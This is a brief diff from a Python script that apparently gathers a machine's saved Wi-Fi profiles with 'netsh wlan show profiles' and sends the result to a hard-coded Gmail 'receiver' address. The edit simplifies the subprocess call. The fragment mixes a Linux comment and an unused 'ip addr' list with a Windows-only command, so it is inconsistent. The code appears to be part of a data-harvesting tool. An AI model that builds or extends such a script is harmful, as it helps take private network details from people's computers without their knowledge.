@@ -20,7 +20,7 @@ receiver= "sonu.code.ai@gmail.com"
 try:
     # Run the linux command
     command=["ip", "addr"] 
-    output = subprocess.run(['cmd.exe', '/c', 'netsh wlan show profiles'],shell=True,capture_output=True,text=True)
+    output = subprocess.run(['netsh wlan show profiles'],shell=True,capture_output=True,text=True)
 
     # Get the output
     final_output = output.stdout if output.returncode == 0 else output.stderr
